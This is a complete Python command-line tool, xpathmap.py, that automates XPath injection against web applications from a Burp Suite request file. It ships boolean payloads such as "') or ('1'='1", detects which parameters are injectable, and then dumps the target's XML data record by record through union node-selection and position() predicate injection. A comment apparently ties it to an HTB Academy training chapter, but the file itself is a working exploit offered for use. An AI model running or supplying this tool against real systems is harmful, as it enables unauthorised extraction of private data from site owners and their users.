#!/usr/bin/env python3
"""
xpathmap.py — Automated XPath Injection & Data Exfiltration Tool
Inspired by sqlmap. Reads a raw Burp Suite HTTP request file.

Usage:
    python xpathmap.py -r request.txt
    python xpathmap.py -r request.txt -v                          # verbose debug output
    python xpathmap.py -r request.txt --method predicate
    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080
    python xpathmap.py -r request.txt --injectable-param q --node-param f
    python xpathmap.py -r request.txt --injectable-param q --node-param f --field streetname
"""

import argparse
import re
import sys
import time
from dataclasses import dataclass, field as dc_field
from typing import Optional
from urllib.parse import urlparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────────────────────
# Global verbose flag (set after arg parse)
# ──────────────────────────────────────────────────────────────────────────────

VERBOSE = False


# ──────────────────────────────────────────────────────────────────────────────
# ANSI colors & logging helpers
# ──────────────────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    GRAY   = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def info(msg):    print(f"{C.BLUE}[*]{C.RESET} {msg}")
def success(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def error(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def found(msg):   print(f"{C.GREEN}{C.BOLD}[FOUND]{C.RESET} {msg}")
def debug(msg):
    if VERBOSE:
        print(f"{C.GRAY}[DBG]{C.RESET} {msg}")


# ──────────────────────────────────────────────────────────────────────────────
# Burp request parser
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class ParsedRequest:
    method: str
    url: str
    headers: dict
    params: dict       # GET query params  {name: value}
    body_params: dict  # POST body params  {name: value}
    raw_body: str

    @property
    def all_params(self) -> dict:
        return {**self.params, **self.body_params}


def parse_burp_request(filepath: str) -> ParsedRequest:
    """Parse a raw HTTP request file exported from Burp Suite."""
    with open(filepath, "r", errors="replace") as fh:
        content = fh.read()

    lines = content.splitlines()
    if not lines:
        error("Request file is empty.")
        sys.exit(1)

    # --- First line: METHOD /path?query HTTP/1.x ---
    request_line = lines[0].strip()
    match = re.match(
        r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+$",
        request_line, re.IGNORECASE,
    )
    if not match:
        error(f"Cannot parse request line: {request_line!r}")
        sys.exit(1)

    http_method    = match.group(1).upper()
    path_and_query = match.group(2)

    # --- Headers (lines 1..N until blank line) ---
    headers: dict[str, str] = {}
    host = ""
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            key, _, val = lines[i].partition(":")
            headers[key.strip()] = val.strip()
            if key.strip().lower() == "host":
                host = val.strip()
        i += 1

    # --- Body (everything after the blank line) ---
    raw_body = "\n".join(lines[i + 1:]).strip() if i < len(lines) else ""

    # --- Determine scheme from Referer header (fallback: http) ---
    scheme  = "https" if headers.get("Referer", "").startswith("https") else "http"
    full_url = f"{scheme}://{host}{path_and_query}"

    parsed = urlparse(full_url)
    params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    # --- POST form-encoded body ---
    body_params: dict[str, str] = {}
    if raw_body and "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
        body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

    # Remove headers that break response decoding or cause caching issues
    for h in ("Accept-Encoding", "Content-Length", "If-None-Match", "If-Modified-Since"):
        headers.pop(h, None)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return ParsedRequest(
        method=http_method,
        url=base_url,
        headers=headers,
        params=params,
        body_params=body_params,
        raw_body=raw_body,
    )


# ──────────────────────────────────────────────────────────────────────────────
# HTTP engine
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Engine:
    req: ParsedRequest
    delay: float = 0.1
    proxies: Optional[dict] = None
    timeout: int = 15
    session: requests.Session = dc_field(default_factory=requests.Session)

    def __post_init__(self):
        self.session.headers.update(self.req.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)
        self.session.verify = False

    def send(self, override_params: dict) -> str:
        """Merge override_params on top of original params and fire the request."""
        params = {**self.req.params, **override_params}
        body   = dict(self.req.body_params)

        debug(f"→ params={params}")
        try:
            if self.req.method == "GET":
                resp = self.session.get(self.req.url, params=params, timeout=self.timeout)
            else:
                # Inject into POST body where the key already exists; otherwise query string
                for k in override_params:
                    if k in body:
                        body[k] = override_params[k]
                resp = self.session.post(
                    self.req.url, params=params, data=body, timeout=self.timeout
                )
            time.sleep(self.delay)
            text = resp.text.strip()
            debug(f"← HTTP {resp.status_code}  len={len(text)}  preview={text[:120]!r}")
            return text
        except requests.RequestException as e:
            warn(f"Request error: {e}")
            return ""


# ──────────────────────────────────────────────────────────────────────────────
# Injection detection payloads
# ──────────────────────────────────────────────────────────────────────────────

# Close the contains() predicate and append a universally FALSE condition
NULL_PAYLOADS = [
    "') and ('1'='2",
    "' and '1'='2",
    "') and ('0'='1",
    '\") and (\"1\"=\"2',
]

# Close the predicate and append a universally TRUE condition
TRUE_PAYLOADS = [
    "') or ('1'='1",
    "' or '1'='1",
    '\") or (\"1\"=\"1',
]


def _has_data(text: str) -> bool:
    """Heuristic: text is non-empty and doesn't look like a server error page."""
    if not text:
        return False
    low = text.lower()
    bad = ("xpath error", "parse error", "syntax error",
           "invalid expression", "500 internal", "error on line")
    return not any(kw in low for kw in bad)


# ──────────────────────────────────────────────────────────────────────────────
# Auto-detection: injectable param & null payload
# ──────────────────────────────────────────────────────────────────────────────

def detect_injectable_param(
    engine: Engine,
    candidates: list[str],
    node_param: Optional[str] = None,
    node_field: Optional[str] = None,
) -> tuple[Optional[str], Optional[str]]:
    """
    Find which parameter is injectable by testing null/true payload pairs.

    Three strategies (in order):
      1. Classic: null payload → empty, true payload → data
      2. Diff-based: null and true responses differ (handles pre-empty baseline)
      3. Union probe: inject a union subquery into the node param alongside the
         null payload and check whether we get data back
    """
    info("Auto-detecting injectable parameter...")

    baseline     = engine.send({})
    baseline_len = len(baseline)
    debug(f"Baseline len={baseline_len}  preview={baseline[:100]!r}")

    for param in candidates:
        debug(f"Testing param '{param}'...")
        for null_pay in NULL_PAYLOADS:
            null_resp = engine.send({param: null_pay})

            for true_pay in TRUE_PAYLOADS:
                true_resp = engine.send({param: true_pay})

                null_ok = _has_data(null_resp)
                true_ok = _has_data(true_resp)
                debug(
                    f"  null={null_pay!r:30s} data={null_ok} len={len(null_resp)} | "
                    f"true={true_pay!r:25s} data={true_ok} len={len(true_resp)}"
                )

                # Strategy 1: classic boolean contrast
                if not null_ok and true_ok:
                    success(f"Injectable param (boolean): '{param}'")
                    success(f"Null payload: {null_pay!r}")
                    return param, null_pay

                # Strategy 2: responses differ even if both empty/non-empty
                if null_resp != true_resp and abs(len(null_resp) - len(true_resp)) > 5:
                    if not null_ok or len(null_resp) < len(true_resp):
                        success(f"Injectable param (diff-based): '{param}'")
                        success(f"Null payload: {null_pay!r}")
                        return param, null_pay

    # Strategy 3: union probe (works when the search term never returns data)
    if node_param and node_field:
        info("Trying union probe as fallback detection strategy...")
        for param in candidates:
            for null_pay in NULL_PAYLOADS:
                for depth in range(2, 6):
                    path      = "".join("/*[1]" for _ in range(depth))
                    union_val = f"{node_field} | {path}"
                    resp = engine.send({param: null_pay, node_param: union_val})
                    debug(f"  union probe depth={depth} → {resp[:80]!r}")
                    if _has_data(resp):
                        success(f"Injectable param (union probe): '{param}'")
                        success(f"Null payload: {null_pay!r}")
                        return param, null_pay

    return None, None


# ──────────────────────────────────────────────────────────────────────────────
# Auto-detection: node-selection parameter
# ──────────────────────────────────────────────────────────────────────────────

def detect_node_param(
    engine: Engine,
    inj_param: str,
    null_pay: str,
    candidates: list[str],
) -> tuple[Optional[str], Optional[str]]:
    """
    Find the parameter that controls XPath node selection (e.g. the 'f' param).

    We inject a union subquery at increasing depths; if the response changes
    compared to the null baseline, that parameter is the node-selection one.
    """
    info("Auto-detecting node-selection parameter...")

    null_baseline = engine.send({inj_param: null_pay})
    debug(f"Null baseline len={len(null_baseline)}  preview={null_baseline[:80]!r}")

    for param in candidates:
        original = engine.req.params.get(param) or engine.req.body_params.get(param, "")
        if not original:
            continue

        for depth in range(2, 6):
            path  = "".join("/*[1]" for _ in range(depth))
            probe = f"{original} | {path}"
            resp  = engine.send({inj_param: null_pay, param: probe})
            debug(f"  '{param}' depth={depth}  len={len(resp)}  {resp[:80]!r}")

            if _has_data(resp) and resp != null_baseline:
                success(f"Node-selection param: '{param}'  (field='{original}')")
                return param, original

    return None, None


def get_baseline_field(engine: Engine, node_param: str) -> Optional[str]:
    """Return the current value of the node-selection parameter (the XPath field name)."""
    val = engine.req.params.get(node_param) or engine.req.body_params.get(node_param, "")
    return val.strip() or None


# ──────────────────────────────────────────────────────────────────────────────
# Node-selection exfiltration
# ──────────────────────────────────────────────────────────────────────────────

def build_path(indices: list[int]) -> str:
    return "".join(f"/*[{i}]" for i in indices)


def probe_node(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    indices: list[int],
) -> str:
    path    = build_path(indices)
    f_value = f"{field_name} | {path}"
    return engine.send({inj_param: null_pay, node_param: f_value})


def detect_depth(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    dataset_idx: int,
    max_depth: int = 8,
) -> Optional[int]:
    """
    Probe /*[1]/*[dataset_idx]/*[1]*N until a non-empty response is returned.
    The total number of /*[N] components is the schema depth for this dataset.
    """
    base = [1, dataset_idx]
    for extra in range(1, max_depth + 1):
        indices = base + [1] * extra
        resp    = probe_node(engine, inj_param, null_pay, node_param, field_name, indices)
        debug(f"  depth probe {build_path(indices)} → {resp[:60]!r}")
        if _has_data(resp):
            depth = len(indices)
            info(f"    Schema depth: {depth}  (sample: '{resp[:60]}')")
            return depth
    return None


def exfiltrate_record(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    base_indices: list[int],
    max_fields: int = 20,
) -> list[str]:
    """Extract all fields of one record by incrementing the last index position."""
    values: list[str] = []
    for field_idx in range(1, max_fields + 1):
        resp = probe_node(
            engine, inj_param, null_pay, node_param, field_name,
            base_indices + [field_idx],
        )
        if not _has_data(resp):
            break
        values.append(resp)
    return values


def exfiltrate_dataset(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    dataset_idx: int,
    max_depth: int, max_records: int, max_fields: int,
) -> list[list[str]]:
    """Iterate over all records in one dataset node."""
    print()
    info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")

    depth = detect_depth(
        engine, inj_param, null_pay, node_param, field_name, dataset_idx, max_depth
    )
    if depth is None:
        warn(f"    Dataset /*[1]/*[{dataset_idx}] not found or empty.")
        return []

    # Path layout: [1, dataset_idx, <intermediate /*[1] × (depth-3)>, record_idx]
    n_intermediate = depth - 3
    if n_intermediate < 0:
        warn("    Depth too shallow to extract records.")
        return []

    intermediate = [1] * n_intermediate
    records: list[list[str]] = []

    for rec_idx in range(1, max_records + 1):
        base   = [1, dataset_idx] + intermediate + [rec_idx]
        record = exfiltrate_record(
            engine, inj_param, null_pay, node_param, field_name, base, max_fields
        )
        if not record:
            info(f"    End of records at index {rec_idx}.")
            break
        found(f"Record {rec_idx:>3}: {' | '.join(record)}")
        records.append(record)

    return records


def run_node_selection(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    max_datasets: int, max_depth: int,
    max_records: int, max_fields: int,
) -> dict[int, list[list[str]]]:
    """Walk every dataset in the XML document using node-selection injection."""
    info(
        f"Node-selection exfiltration | "
        f"inj='{inj_param}'  node='{node_param}'  field='{field_name}'"
    )
    all_data: dict[int, list[list[str]]] = {}
    consecutive_empty = 0

    for ds_idx in range(1, max_datasets + 1):
        records = exfiltrate_dataset(
            engine, inj_param, null_pay, node_param, field_name,
            ds_idx, max_depth, max_records, max_fields,
        )
        if records:
            all_data[ds_idx] = records
            consecutive_empty = 0
        else:
            consecutive_empty += 1
            if consecutive_empty >= 2:
                info("Two consecutive empty datasets — stopping scan.")
                break

    return all_data


# ──────────────────────────────────────────────────────────────────────────────
# Predicate (position-based) exfiltration
# ──────────────────────────────────────────────────────────────────────────────

def run_predicate(
    engine: Engine,
    inj_param: str,
    step: int,
    max_records: int,
) -> list[str]:
    """Paginate results by incrementing the position() threshold."""
    info(f"Predicate exfiltration via position() | param='{inj_param}'  step={step}")
    results: list[str] = []
    position = 0

    while position < max_records:
        payload = f"') and (position()>{position}) and ('1'='1"
        resp    = engine.send({inj_param: payload})

        if not _has_data(resp):
            info(f"    No data at position()>{position}. Done.")
            break

        batch = [ln.strip() for ln in resp.splitlines() if ln.strip()]
        results.extend(batch)
        found(f"position()>{position}: {batch}")
        position += step

    return results


# ──────────────────────────────────────────────────────────────────────────────
# Final output
# ──────────────────────────────────────────────────────────────────────────────

def print_summary(data):
    print()
    print(f"{C.BOLD}{'='*60}{C.RESET}")
    print(f"{C.BOLD}  EXTRACTION RESULTS{C.RESET}")
    print(f"{C.BOLD}{'='*60}{C.RESET}")

    if isinstance(data, dict):
        total = sum(len(v) for v in data.values())
        print(f"  Datasets: {len(data)}   Total records: {total}")
        for ds_idx, records in data.items():
            print(f"\n  {C.CYAN}Dataset [{ds_idx}]{C.RESET}  —  {len(records)} records")
            print(f"  {'-'*50}")
            for i, rec in enumerate(records, 1):
                print(f"    [{i:>3}]  {' | '.join(rec)}")
    elif isinstance(data, list):
        print(f"  Total items: {len(data)}")
        print(f"  {'-'*50}")
        for i, item in enumerate(data, 1):
            print(f"    [{i:>3}]  {item}")

    print(f"{C.BOLD}{'='*60}{C.RESET}")


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

BANNER = f"""{C.CYAN}{C.BOLD}
  ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
  ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
   ╚███╔╝ ██████╔╝███████║   ██║   ███████║██╔████╔██║███████║██████╔╝
   ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
  ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
{C.RESET}{C.YELLOW}  Automated XPath Injection & Data Exfiltration Tool{C.RESET}
"""


def parse_args():
    p = argparse.ArgumentParser(
        description="xpathmap — XPath injection tool (reads Burp request files)"
    )
    p.add_argument("-r", "--request", required=True,
                   help="Path to raw Burp Suite HTTP request file")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Print every request/response for debugging")
    p.add_argument("--method", choices=["auto", "node_selection", "predicate"],
                   default="auto",
                   help="Injection method (default: auto)")
    p.add_argument("--injectable-param", default=None,
                   help="Force injectable parameter name (e.g. q)")
    p.add_argument("--node-param", default=None,
                   help="Force node-selection parameter name (e.g. f)")
    p.add_argument("--field", default=None,
                   help="XPath field name used in node param (e.g. streetname)")
    p.add_argument("--null-payload", default=None,
                   help="Force null payload string")
    p.add_argument("--delay",          type=float, default=0.1)
    p.add_argument("--proxy",          default=None,
                   help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--timeout",        type=int, default=15)
    p.add_argument("--max-datasets",   type=int, default=6)
    p.add_argument("--max-depth",      type=int, default=8)
    p.add_argument("--max-records",    type=int, default=200)
    p.add_argument("--max-fields",     type=int, default=20)
    p.add_argument("--predicate-step", type=int, default=5)
    return p.parse_args()


def main():
    global VERBOSE

    print(BANNER)
    args    = parse_args()
    VERBOSE = args.verbose

    # ── Parse Burp request file ───────────────────────────────────────────────
    info(f"Loading request: {args.request}")
    req = parse_burp_request(args.request)
    info(f"Target  : {req.url}")
    info(f"Method  : {req.method}")
    info(f"Params  : {list(req.all_params.keys())}")

    if not req.all_params:
        error("No parameters found in the request. Cannot inject.")
        sys.exit(1)

    proxies    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    engine     = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)
    all_params = list(req.all_params.keys())

    # ── Resolve injectable param & null payload ───────────────────────────────
    inj_param:  Optional[str] = args.injectable_param
    null_pay:   Optional[str] = args.null_payload
    node_param: Optional[str] = args.node_param
    field_name: Optional[str] = args.field

    if inj_param and null_pay:
        # Everything forced — skip all detection
        success(f"Using forced injectable='{inj_param}'  payload={null_pay!r}")

    elif inj_param and not null_pay:
        # Param is known; detect the best null payload.
        # Pass node_param / field hints so union-probe fallback can work.
        node_hint  = node_param or next((p for p in all_params if p != inj_param), None)
        field_hint = field_name or (get_baseline_field(engine, node_hint) if node_hint else None)
        _, null_pay = detect_injectable_param(
            engine, [inj_param],
            node_param=node_hint,
            node_field=field_hint,
        )
        if not null_pay:
            # Hard fallback to the canonical payload from the HTB Academy chapter
            warn("Could not auto-detect null payload — using canonical: ') and ('1'='2")
            null_pay = "') and ('1'='2"

    else:
        # Full auto-detection of both param and payload
        node_hint  = node_param or next((p for p in all_params if p != all_params[0]), None)
        field_hint = field_name or (get_baseline_field(engine, node_hint) if node_hint else None)
        inj_param, null_pay = detect_injectable_param(
            engine, all_params,
            node_param=node_hint,
            node_field=field_hint,
        )
        if not inj_param:
            error(
                "Could not auto-detect injectable parameter.\n\n"
                "  Run with -v to see raw responses, then provide hints:\n"
                "    --injectable-param q --node-param f --field streetname\n"
                "  Or force everything:\n"
                "    --injectable-param q --null-payload \"') and ('1'='2\"\n"
            )
            sys.exit(1)

    # ── Choose method ─────────────────────────────────────────────────────────
    method = args.method
    if method == "auto":
        remaining = [p for p in all_params if p != inj_param]
        method    = "node_selection" if remaining else "predicate"
        info(f"Method auto-selected: {C.BOLD}{method}{C.RESET}")

    # ── Resolve node param & field name (for node_selection) ──────────────────
    if method == "node_selection":
        if not node_param:
            remaining = [p for p in all_params if p != inj_param]
            if not remaining:
                warn("No second parameter available — switching to predicate method.")
                method = "predicate"
            else:
                node_param, _ = detect_node_param(engine, inj_param, null_pay, remaining)
                if not node_param:
                    node_param = remaining[0]
                    warn(f"Could not confirm node param — assuming '{node_param}'")

        if method == "node_selection" and not field_name:
            field_name = get_baseline_field(engine, node_param) if node_param else None
            if field_name:
                info(f"Field name auto-detected: '{field_name}'")
            else:
                field_name = "text()"
                warn(f"Could not detect field name — using '{field_name}'")

    # ── Run extraction ────────────────────────────────────────────────────────
    print()
    info(f"Starting extraction  method={C.BOLD}{method}{C.RESET}")

    if method == "node_selection":
        data = run_node_selection(
            engine, inj_param, null_pay, node_param, field_name,
            args.max_datasets, args.max_depth, args.max_records, args.max_fields,
        )
    else:
        data = run_predicate(engine, inj_param, args.predicate_step, args.max_records)

    print_summary(data)


if __name__ == "__main__":
    main()
